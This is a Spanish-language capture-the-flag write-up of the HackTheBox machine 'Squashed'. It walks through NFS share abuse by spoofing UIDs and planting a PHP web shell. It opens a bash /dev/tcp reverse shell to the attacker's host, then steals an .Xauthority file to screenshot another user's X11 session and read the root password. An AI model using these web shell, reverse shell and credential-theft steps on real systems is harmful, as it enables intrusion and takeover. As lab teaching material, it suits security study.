---
layout: single
title: Squashed - HackTheBox
excerpt: " Easy-level machine, a quiet interesting machine that is actually realistic. Squashed abuses a couple of NFS shares in a nice introduction to NFS. "
date: 2023-03-04
classes: wide
header:
  teaser: /blog/assets/images/htb-writeup-squashed/squashed.png
  teaser_home_page: true
  icon: /blog/assets/images/htb.webp
categories:
  - hackthebox
tags:
  - X11
  - xwd
  - Screen
  - NFS
  - Mount
---

Easy-level machine, a quiet interesting machine that is actually realistic. Squashed abuses a couple of NFS shares in a nice introduction to NFS.

# Summary
- IP: 10.10.11.191
- OS: Linux (Ubuntu)
- Services & Applications:

```js
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Built Better
|_http-server-header: Apache/2.4.41 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      35727/tcp6  mountd
|   100005  1,2,3      39826/udp   mountd
|   100005  1,2,3      56326/udp6  mountd
|   100005  1,2,3      59739/tcp   mountd
|   100021  1,3,4      33043/tcp6  nlockmgr
|   100021  1,3,4      43517/tcp   nlockmgr
|   100021  1,3,4      50716/udp   nlockmgr
|   100021  1,3,4      55216/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  3 (RPC #100227)
39669/tcp open  mountd   1-3 (RPC #100005)
43517/tcp open  nlockmgr 1-4 (RPC #100021)
50377/tcp open  mountd   1-3 (RPC #100005)
59739/tcp open  mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.11.191 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p22,80,111,2049,39669,43517,50377,59739 -sCV 10.10.11.191 -oN targeted
```


# Análisis de página web:

- En la página web principal no encontramos nada interesante, solo vemos servicios de decoración de hogar.


# Análisis de servicio NFS (Puerto 2049):

- Al echar un vistazo en [Pentesting NFS Service - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting), podemos aprender un poco sobre enumeración de este servicio.

- Entonces, para saber que carpeta tiene el servidor disponible para montar usamos el siguiente comando:

```bash
$showmount -e 10.10.11.191
```

```js
Export list for 10.10.11.191:
/home/ross    *
/var/www/html *
```

- Podemos ver dos directorios, los montamos, el primero en una carpeta llamada "ross_home" y el otro en "web":

```bash
$mount -t nfs 10.10.11.191:/home/ross /home/dante/mnt/ross_home/ -o nolock
$mount -t nfs 10.10.11.191:/var/www/html /home/dante/mnt/web/ -o nolock
```

- Ahora si intentamos examinar lo que hay en el directorio web, no podremos porque nos dice "permiso denegado", si vemos los permisos que tiene el directorio podemos ver que el propietario tiene la UID `"2017"` y pertenece al grupo "www-data", entonces para `bypassear` esto y poder tener acceso, simplemente nos creamos un usuario y le asignamos dicha UID:

```bash
$sudo adduser prueba
$usermod -u 2017 prueba
```

- Ahora accedemos como dicho usuario `"prueba"` y deberíamos poder ver los recursos del directorio web.

```
$ su prueba
```

- Al examinar index.html, podemos darnos cuenta que los recursos web que hay se tratan de los mismos que se nos muestra al acceder a la página web principal (La página que nos muestra servicios de decoración de hogar).

- Ahora, como tenemos permisos de escritorio en este directorio, podríamos simplemente subir un archivo malicioso, en este caso `PHP`, el cual nos permita ganar acceso al sistema de la máquina víctima.

```bash
$nano cmd.php
```

```
<?php echo passthru($_GET['cmd']); ?>
```


- Ya creado el archivo, accedemos mediante el navegador y confirmamos que podemos ejecutar comandos usando el parámetro "cmd":

```
http://10.10.11.191/cmd.php?cmd=whoami
```

- Nos entablamos una reverse shell y accedemos al sistema como el usuario "alex":

```
http://10.10.11.191/cmd.php?cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.144/443 0>%261"
```

- Dentro del directorio "/home/alex" encontraremos la primera flag.


# ESCALANDO PRIVILEGIOS:


# X11 exploit:

- Si entramos al directorio "/tmp" podemos ver un archivo `"screen.xwd"`, si buscamos en Hacktricks esta extensión de archivo encontramos lo siguiente [6000 - Pentesting X11 - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11)

- Podemos suponer que la máquina víctima está usando este `protocolo de pantalla remota X11` por detrás, por lo que podemos obtener, por ejemplo, la captura de algún usuario activo dentro del sistema, entonces, si enumeramos los usuarios conectados en el sistema podemos ver lo siguiente:

```bash
$w
```

```js
01:02:09 up 1 day, 19:36,  1 user,  load average: 3.14, 3.27, 3.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
ross     tty7     :0               Fri05   43:36m  4:53   0.04s /usr/libexec/gnome-session-binary --systemd --session=gnome
```


- Podemos observar que el usuario `"ross"` está conectado dentro del sistema; entonces ahora la idea es usar el protocolo X11 que habíamos encontrado antes para intentar capturar la pantalla del usuario "ross" ya que se encuentra conectado en el sistema, sin embargo, solo es posible capturar la pantalla del usuario con el que estamos conectados actualmente (recordemos que somos el usuario `"alex"`).

- Pero recordemos que anteriormente habíamos montado mediante el servicio NFS el home del usuario "ross", así que accedemos a este en busca del archivo `".Xauthority"` que es el archivo que contiene información de autenticación para el servidor de pantalla X, que es el servidor de ventanas gráficas que se utiliza para ejecutar aplicaciones gráficas en sistemas Unix/Linux.

- Dentro del directorio donde montamos el home de "ross", si vemos los permisos podemos darnos cuenta que el propietario del archivo ".Xauthority" tiene como UID `"1001"`, así que hacemos lo mismo que hicimos pasos anteriores, en este caso, asignándole dicha UID al usuario que ya habíamos creado:


```bash
$usermod -u 1001 prueba
```

- Ahora, transferimos este archivo a la máquina víctima, para esto, lo convertimos en `base64` y lo guardamos en otro directorio de nuestra máquina atacante:

```bash
$cat .Xauthority | base64  > /tmp/xauth
```

- Ahora en este directorio nos montamos un servidor en python:

```bash
$python3 -m http.server
```

- En la máquina víctima, dentro del directorio `"/tmp"` descargamos el archivo:

```bash
$wget 10.10.14.144:8000/xauth
```

- Lo decodeamos y lo renombramos:

```bash
$cat xauth | base64 -d > .Xauthority
```

- Y ahora exportamos este archivo a la variable `"Xauthority"` de nuestro sistema para que el entorno X11 piense que estamos conectados como el usuario "ross":

```bash
$export XAUTHORITY=/tmp/.Xauthority
```

- Y con todo esto hecho ya podremos sacar una captura de pantalla del usuario `"ross"` el cual está conectado en el sistema, haciendo uso del comando que podemos encontrar en Hacktricks:

```bash
$xwd -root -screen -silent -display :0 > screenshot.xwd
```

- Transferimos este archivo a nuestra máquina atacante.

- Convertimos el archivo en `PNG`:

```bash
$convert screenshot.xwd screenshot.png
```

- Abrimos la imagen y podemos ver en la captura una credencial para el usuario "root", el cual usamos para `pivotar` al usuario root:

```bash
$su root
```

- Seremos `root` y podremos ver la flag en el directorio "/root"
